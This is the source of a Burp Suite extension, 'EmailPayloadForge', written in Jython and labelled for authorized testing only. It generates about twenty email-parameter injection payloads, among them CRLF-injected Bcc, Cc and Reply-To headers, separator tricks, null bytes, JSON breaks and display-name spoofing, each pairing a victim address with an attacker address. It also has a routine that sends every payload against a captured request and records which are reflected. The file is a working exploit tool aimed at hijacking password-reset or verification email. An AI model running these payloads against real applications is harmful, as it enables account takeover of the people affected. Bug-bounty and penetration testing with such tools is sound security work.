# -*- coding: utf-8 -*-
# EmailPayloadForge - Burp Suite Extension (Jython)
# Load via Extender > Extensions > Add > Python
# Requires Jython standalone JAR configured in Extender > Options
#
# AUTHORIZED TESTING ONLY - bug bounty programs and systems you own.

from burp import IBurpExtender, ITab, IHttpListener, IContextMenuFactory
from javax.swing import (JPanel, JTextField, JButton, JLabel, JScrollPane,
                         JTextArea, JCheckBox, JTabbedPane, BorderFactory,
                         JSplitPane, JComboBox, JTable, JMenuItem)
from javax.swing.table import DefaultTableModel
from java.awt import BorderLayout, GridBagLayout, GridBagConstraints, Insets, Color, Font
from java.util import ArrayList
import re
import json


PAYLOADS_TEMPLATE = [
    ("Comma",           "{o},{a}"),
    ("Comma",           "{a},{o}"),
    ("Semicolon",       "{o};{a}"),
    ("Pipe",            "{o}|{a}"),
    ("Newline %0a",     "{o}%0a{a}"),
    ("Newline %0d%0a",  "{o}%0d%0a{a}"),
    ("CRLF Bcc",        "{o}%0d%0aBcc: {a}"),
    ("CRLF Cc",         "{o}%0d%0aCc: {a}"),
    ("CRLF Reply-To",   "{o}%0d%0aReply-To: {a}"),
    ("Array",           '["'+'{o}'+'",' + '"'+'{a}'+'"]'),
    ("Null byte",       "{o}%00{a}"),
    ("Double encode",   "{o}%252c{a}"),
    ("Double encode",   "{o}%250a{a}"),
    ("HTML entity",     "{o}&#44;{a}"),
    ("Tab",             "{o}%09{a}"),
    ("JSON break",      '{o}","email":"{a}'),
    ("Display spoof",   '"{o}" <{a}>'),
    ("Display spoof",   '{a} <{o}>'),
    ("Quoted",          '"{o},{a}"'),
    ("Plus concat",     "{o}+{a}"),
    ("Backslash",       "{o}\\{a}"),
]


def build_payloads(orig, attacker):
    result = []
    for cat, tmpl in PAYLOADS_TEMPLATE:
        result.append((cat, tmpl.replace("{o}", orig).replace("{a}", attacker)))
    return result


class BurpExtender(IBurpExtender, ITab, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName("EmailPayloadForge")
        callbacks.registerContextMenuFactory(self)

        self._results = []
        self._build_ui()
        callbacks.addSuiteTab(self)
        print("[EmailPayloadForge] Loaded - authorized testing only")

    # -- UI ---
    def _build_ui(self):
        self._panel = JPanel(BorderLayout(10, 10))
        self._panel.setBorder(BorderFactory.createEmptyBorder(12, 12, 12, 12))

        # Config row
        cfg = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(4, 4, 4, 4)
        gbc.fill = GridBagConstraints.HORIZONTAL

        gbc.gridx, gbc.gridy, gbc.weightx = 0, 0, 0
        cfg.add(JLabel("Target email:"), gbc)
        gbc.gridx, gbc.weightx = 1, 1
        self._orig_field = JTextField("victim@target.com", 28)
        cfg.add(self._orig_field, gbc)

        gbc.gridx, gbc.gridy, gbc.weightx = 0, 1, 0
        cfg.add(JLabel("Attacker email:"), gbc)
        gbc.gridx, gbc.weightx = 1, 1
        self._atk_field = JTextField("attacker@gmail.com", 28)
        cfg.add(self._atk_field, gbc)

        gbc.gridx, gbc.gridy, gbc.weightx = 0, 2, 0
        cfg.add(JLabel("Param to replace:"), gbc)
        gbc.gridx, gbc.weightx = 1, 1
        self._param_field = JTextField("email", 28)
        cfg.add(self._param_field, gbc)

        gbc.gridx, gbc.gridy, gbc.gridwidth = 0, 3, 2
        gbc.weightx = 1
        self._gen_btn = JButton("Generate & preview payloads",
                                actionPerformed=self._on_generate)
        cfg.add(self._gen_btn, gbc)

        # Results table
        self._table_model = DefaultTableModel(
            ["#", "Category", "Payload", "Status", "Length", "Reflected"], 0)
        self._table = JTable(self._table_model)
        self._table.getColumnModel().getColumn(0).setPreferredWidth(35)
        self._table.getColumnModel().getColumn(1).setPreferredWidth(120)
        self._table.getColumnModel().getColumn(2).setPreferredWidth(400)

        # Log area
        self._log = JTextArea(6, 60)
        self._log.setEditable(False)
        self._log.setFont(Font("Monospaced", Font.PLAIN, 12))

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                           JScrollPane(self._table),
                           JScrollPane(self._log))
        split.setResizeWeight(0.7)

        self._panel.add(cfg, BorderLayout.NORTH)
        self._panel.add(split, BorderLayout.CENTER)

    # -- ITab ---
    def getTabCaption(self):  return "EmailPayloadForge"
    def getUiComponent(self): return self._panel

    # -- Context menu ---
    def createMenuItems(self, invocation):
        items = ArrayList()
        item = JMenuItem("Send to EmailPayloadForge",
                         actionPerformed=lambda e: self._load_request(invocation))
        items.add(item)
        return items

    def _load_request(self, invocation):
        msgs = invocation.getSelectedMessages()
        if not msgs:
            return
        self._pending_msg = msgs[0]
        self._log_line("[*] Request loaded from Proxy/Repeater. Set param name and click Generate.")

    # -- Generate ---
    def _on_generate(self, event):
        orig    = self._orig_field.getText().strip()
        attacker = self._atk_field.getText().strip()
        if not orig or not attacker:
            self._log_line("[-] Enter both email addresses first.")
            return

        payloads = build_payloads(orig, attacker)
        self._table_model.setRowCount(0)
        for i, (cat, pld) in enumerate(payloads, 1):
            self._table_model.addRow([i, cat, pld, "-", "-", "-"])
        self._log_line("[+] Generated {0} payloads. Right-click a Proxy request and "
                       "'Send to EmailPayloadForge', then use Intruder with the exported "
                       "list, or call send_all().".format(len(payloads)))

    # -- Send all via Intruder (helper) ---
    def send_all(self):
        """
        Call this from the Python console to fire all payloads against
        a previously loaded request (via context menu).
        Results update the table automatically.
        """  
        if not hasattr(self, '_pending_msg'):
            self._log_line("[-] No request loaded. Right-click a request first.")
            return

        orig     = self._orig_field.getText().strip()
        attacker = self._atk_field.getText().strip()
        param    = self._param_field.getText().strip()
        payloads = build_payloads(orig, attacker)

        base_req = self._pending_msg.getRequest()
        http_svc = self._pending_msg.getHttpService()

        self._log_line("[*] Sending {0} requests (param={1}) ...".format(len(payloads), param))

        for i, (cat, pld) in enumerate(payloads):
            modified = self._inject_param(base_req, param, orig, pld)
            if modified is None:
                self._table_model.setValueAt("SKIP (param not found)", i, 3)
                continue

            try:
                resp_msg = self._callbacks.makeHttpRequest(http_svc, modified)
                resp     = resp_msg.getResponse()
                info     = self._helpers.analyzeResponse(resp)
                status   = info.getStatusCode()
                body     = self._helpers.bytesToString(resp)[info.getBodyOffset():]
                length   = len(body)
                reflected = "YES" if pld in body or attacker in body else "no"

                self._table_model.setValueAt(str(status),  i, 3)
                self._table_model.setValueAt(str(length),  i, 4)
                self._table_model.setValueAt(reflected,    i, 5)

                if reflected == "YES":
                    self._log_line("[!] REFLECTED - {0}: {1}".format(cat, pld[:60]))
            except Exception as ex:
                self._table_model.setValueAt("ERR: {0}".format(ex), i, 3)

        self._log_line("[+] Done.")

    # -- Helpers ---
    def _inject_param(self, req_bytes, param_name, orig_val, new_val):
        req_str = self._helpers.bytesToString(req_bytes)
        # URL-encoded body param replacement
        pattern = re.compile(re.escape(param_name) + r'=' + re.escape(orig_val))
        if pattern.search(req_str):
            return self._helpers.stringToBytes(
                pattern.sub(param_name + '=' + new_val, req_str, count=1))
        # JSON body param replacement
        json_pat = re.compile(r'("' + re.escape(param_name) + r'"\s*:\s*")' +
                              re.escape(orig_val) + r'"')
        if json_pat.search(req_str):
            return self._helpers.stringToBytes(
                json_pat.sub(r'\g<1>' + new_val.replace('\\', '\\\\') + '"',
                             req_str, count=1))
        return None

    def _log_line(self, msg):
        self._log.append(msg + "\n")
        self._log.setCaretPosition(self._log.getDocument().getLength())
